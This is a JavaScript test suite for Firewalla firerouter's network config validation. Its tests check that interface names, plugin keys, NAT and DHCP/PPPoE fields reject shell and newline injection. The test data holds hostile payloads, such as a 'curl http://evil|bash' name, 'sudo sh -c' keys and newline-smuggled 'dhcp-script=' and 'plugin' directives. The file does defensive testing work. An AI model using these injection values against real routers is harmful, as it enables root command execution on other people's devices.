/*    Copyright 2016-2024 Firewalla Inc.
 *
 *    This program is free software: you can redistribute it and/or  modify
 *    it under the terms of the GNU Affero General Public License, version 3,
 *    as published by the Free Software Foundation.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU Affero General Public License for more details.
 *
 *    You should have received a copy of the GNU Affero General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

'use strict'

const path = require('path');
// resolve the plugin registry from this checkout so the suite also runs off-device
process.env.FIREROUTER_HOME = process.env.FIREROUTER_HOME || path.resolve(__dirname, '../..');

let chai = require('chai');
let expect = chai.expect;

const uuid = require('uuid');
const ncm = require('../../core/network_config_mgr.js');
let log = require('../../util/logger.js')(__filename, 'info');
const rclient = require('../../util/redis_manager').getRedisClient();

describe('Test network config manager', function(){
  this.timeout(30000);
  beforeEach(async () => {
      this.testkey = "sysdb:transaction:networkConfig";
      this.origin = await rclient.getAsync(this.testkey);
      this.nwkey = "sysdb:networkConfig";
      this.nw = await rclient.getAsync(this.nwkey);
  });

  afterEach(async () => {
      await rclient.setAsync(this.testkey, this.origin);
      await rclient.setAsync(this.nwkey, this.nw);
  });

  it('should validate network ncid', async()=> {
    const nwConfig = {"version":1,"interface":{"phy":{"eth0":{}}},"ts":1726648571944};
    expect(await ncm.validateNcidOrReqId(nwConfig, true)).to.be.undefined;

    await rclient.setAsync(this.testkey, `{"version":1,"interface":{"phy":{"eth0":{}}},"ts":1726648571944, "ncid":"test"}`);
    expect(await ncm.validateNcidOrReqId(nwConfig, true)).to.be.undefined;
  });

  it('should fail to validate network ncid', async()=> {
    await rclient.setAsync(this.testkey, `{"version":1,"interface":{"phy":{"eth0":{}}},"ts":1726648571944, "ncid":"test"}`);

    const nwConfig = {"version":1,"interface":{"phy":{"eth0":{}}},"ts":1726648571944, ncid: "2df97f9efb0ad09b7201726801377449"};
    expect(await ncm.validateNcidOrReqId(nwConfig, true)).to.be.eql(["ncid not match"]);

    expect(await ncm.validateNcidOrReqId(nwConfig, true, true)).to.be.undefined;
  });

});

// validateConfig is the single choke point that keeps config values out of the shell commands and
// file paths the plugins build, so it is covered on its own and needs no redis
describe('Test network config validation', function(){
  this.timeout(30000);

  // validateConfig fills in meta.uuid, so every case works on a copy
  const clone = (o) => JSON.parse(JSON.stringify(o));
  const baseConfig = () => clone(require('../../network/default_setup.json'));

  // payloads that must never be accepted as a name, each one reaches a shell somewhere
  const INJECTION_NAMES = [
    "eth0 up; curl http://evil|bash #",
    "eth0_x$(id)",
    "eth0;id",
    "eth0`id`",
    "eth0|id",
    "eth0&id",
    "a/b",
    "eth0 ",
    "x".repeat(16),
  ];

  describe('shipped configs', function(){
    // guards against a rule that is too strict to accept what firerouter itself ships
    it('should accept default_setup.json', async()=> {
      const errors = await ncm.validateConfig(clone(require('../../network/default_setup.json')));
      expect(errors).to.be.empty;
    });

    it('should accept default_4ports.json', async()=> {
      const errors = await ncm.validateConfig(clone(require('../../network/default_4ports.json')));
      expect(errors).to.be.empty;
    });
  });

  describe('interface names', function(){
    it('should accept real kernel interface names', async()=> {
      for (const name of ["eth0", "br0", "eth0.100", "eth0:0", "wg_ap", "tun_fwvpn", "bond0", "vbr100"]) {
        const config = baseConfig();
        config.interface.phy = { [name]: { enabled: true, meta: { type: "wan" } } };
        const errors = await ncm.validateConfig(config);
        expect(errors, `expected ${name} to be accepted`).to.be.empty;
      }
    });

    it('should reject names carrying shell metacharacters', async()=> {
      for (const name of INJECTION_NAMES) {
        const config = baseConfig();
        config.interface.phy = { [name]: { enabled: true, meta: { type: "wan" } } };
        const errors = await ncm.validateConfig(config);
        log.debug("rejected interface name", name, errors);
        expect(errors, `expected ${JSON.stringify(name)} to be rejected`).to.not.be.empty;
      }
    });
  });

  describe('referenced lower interfaces', function(){
    // vlan/bond/pppoe name their lower interface in a value, and it is interpolated into an ip
    // command before the plugin ever looks it up
    it('should accept a normal vlan lower interface', async()=> {
      const config = baseConfig();
      config.interface.vlan = { "eth0.100": { intf: "eth0", vid: 100, enabled: true } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
    });

    it('should reject an injected string lower interface', async()=> {
      const config = baseConfig();
      config.interface.vlan = { "eth0.100": { intf: "eth0; id #", vid: 100, enabled: true } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.not.be.empty;
    });

    it('should reject an injected member of a bond interface array', async()=> {
      const config = baseConfig();
      config.interface.bond = { "bond0": { intf: ["eth1", "eth2; id #"], enabled: true } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.not.be.empty;
    });
  });

  describe('meta.uuid', function(){
    it('should generate a uuid when absent', async()=> {
      const config = baseConfig();
      config.interface.phy = { "eth0": { enabled: true, meta: { type: "wan" } } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
      expect(config.interface.phy.eth0.meta.uuid).to.be.a('string');
    });

    it('should accept a caller supplied canonical uuid', async()=> {
      const config = baseConfig();
      const id = uuid.v4();
      config.interface.phy = { "eth0": { enabled: true, meta: { type: "wan", uuid: id } } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
      expect(config.interface.phy.eth0.meta.uuid).to.be.equal(id);
    });

    it('should reject a malformed uuid instead of regenerating it', async()=> {
      const config = baseConfig();
      config.interface.phy = { "eth0": { enabled: true, meta: { type: "wan", uuid: "x; id > /tmp/pwn; #" } } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.not.be.empty;
    });
  });

  describe('non-interface plugin sections', function(){
    // plugin_loader creates an instance per key of every registered config_path, and those keys
    // reach shell commands and file paths in most plugins
    const CATEGORIES = ["upnp", "icmp", "hostapd", "docker", "dns", "sshd", "nat", "routing", "dhcp", "mroute"];

    it('should reject an injected key in any plugin section', async()=> {
      for (const category of CATEGORIES) {
        const config = baseConfig();
        config[category] = { "eth0; sudo sh -c 'id > /tmp/pwned' #": {} };
        const errors = await ncm.validateConfig(config);
        expect(errors, `expected injected key in config.${category} to be rejected`).to.not.be.empty;
      }
    });

    it('should accept the section keys firerouter actually uses', async()=> {
      const config = baseConfig();
      config.nat = { "br0_eth3": { out: "eth0", srcSubnets: ["10.0.0.0/8"] } };
      config.routing = { "global": {} };
      config.dns = { "default": {}, "br0": {} };
      config.sshd = { "br0": { enabled: true } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
    });
  });

  describe('control characters', function(){
    // a control character never reaches a shell here, it reaches a line-oriented config file that a
    // root daemon reads, where a line break starts a directive of its own
    it('should reject a line break in a dhcp option value', async()=> {
      const config = baseConfig();
      config.dhcp = { "br0": { range: { from: "192.168.1.100", to: "192.168.1.200" },
        extraOptions: { "15": "example.test\ndhcp-script=/tmp/pwn.sh" } } };
      const errors = await ncm.validateConfig(config);
      log.debug("rejected dhcp option", errors);
      expect(errors).to.deep.equal(["control character in dhcp.br0.extraOptions.15"]);
    });

    it('should reject a line break in a pppoe field', async()=> {
      const config = baseConfig();
      config.interface.pppoe = { "ppp0": { intf: "eth0", username: "u", password: "p",
        mru: "1492\nplugin /tmp/pwn.so" } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.deep.equal(["control character in interface.pppoe.ppp0.mru"]);
    });

    it('should reject a line break in a dhcp6 prefix hint', async()=> {
      const config = baseConfig();
      config.interface.phy.eth0.dhcp6 = { numOfPDs: 1, pdHints: ["2001:db8::/56\nnohook resolv.conf"] };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.deep.equal(["control character in interface.phy.eth0.dhcp6.pdHints[0]"]);
    });

    it('should reject a line break in a plugin section key', async()=> {
      const config = baseConfig();
      config.dns = { "br0\nconf-file=/tmp/pwn.conf": {} };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.deep.equal(["control character in dns.br0\\nconf-file=/tmp/pwn.conf"]);
    });

    it('should reach the sections no plugin in this repo parses', async()=> {
      // apc goes to fwapc and the wireguard `extra` tree is app metadata, neither is walked by a
      // plugin here, so the sweep is the only thing that looks at them
      const config = baseConfig();
      config.apc = { assets: { "20:6D:31:AF:00:51": { sysConfig: { name: "lobby\nssid=evil" } } } };
      let errors = await ncm.validateConfig(config);
      expect(errors).to.deep.equal(["control character in apc.assets.20:6D:31:AF:00:51.sysConfig.name"]);

      const config2 = baseConfig();
      config2.interface.wireguard = { "wg0": { privateKey: "k", extra: { peers: [{ name: "phone\nx" }] } } };
      errors = await ncm.validateConfig(config2);
      expect(errors).to.deep.equal(["control character in interface.wireguard.wg0.extra.peers[0].name"]);
    });

    it('should catch every control character, not only CR and LF', async()=> {
      for (const ch of ["\x00", "\x07", "\x1b", "\x7f"]) {
        const config = baseConfig();
        config.interface.phy.eth0.extra = { dnsTestDomain: `example.com${ch}` };
        const errors = await ncm.validateConfig(config);
        expect(errors, `char ${JSON.stringify(ch)}`).to.deep.equal(["control character in interface.phy.eth0.extra.dnsTestDomain"]);
      }
    });

    it('should accept an ssid holding an arbitrary byte', async()=> {
      // 802.11 makes the ssid an opaque octet string, and in client mode the box has to be able to
      // join whatever the AP broadcasts rather than refuse to be configured for it
      const config = baseConfig();
      config.hostapd = { "wlan0": { enabled: true, params: { ssid: "my\nnet", wpa_passphrase: "secret123" } } };
      let errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;

      const client = baseConfig();
      client.interface.wlan = { "wlan0": { enabled: true, wpaSupplicant: { networks: [{ ssid: "my\nnet", psk: "secret123" }] } } };
      errors = await ncm.validateConfig(client);
      expect(errors).to.be.empty;
    });

    it('should reject a wifi passphrase the same way wherever it lives', async()=> {
      // being hex encoded downstream makes a control character harmless, not meaningful. a
      // passphrase is printable ascii per 802.11i, so one here is a paste accident
      const hostapd = baseConfig();
      hostapd.hostapd = { "wlan0": { enabled: true, params: { ssid: "mynet", wpa_passphrase: "pass\nword" } } };
      expect(await ncm.validateConfig(hostapd)).to.deep.equal(["control character in hostapd.wlan0.params.wpa_passphrase"]);

      // the same value under the APC tree, which used to be treated differently
      const apc = baseConfig();
      apc.apc = { profile: { "p1": { ssid: "mynet", key: "pass\nword" } } };
      expect(await ncm.validateConfig(apc)).to.deep.equal(["control character in apc.profile.p1.key"]);
    });

    it('should accept display names holding non ascii', async()=> {
      // real boxes carry CJK and emoji in these fields
      const config = baseConfig();
      config.interface.phy.eth0.meta.name = "办公室 🏢";
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
    });
  });

  describe('nat egress interface', function(){
    // nat names its egress interface in a value and never resolves it through the plugin registry
    it('should accept a real egress interface', async()=> {
      const config = baseConfig();
      config.nat = { "x": { out: "eth0", srcSubnets: ["10.0.0.0/8"] } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
    });

    it('should reject an injected egress interface', async()=> {
      const config = baseConfig();
      config.nat = { "x": { out: "eth0 -j ACCEPT; sudo id; #", srcSubnets: ["10.0.0.0/8"] } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.not.be.empty;
    });
  });
});
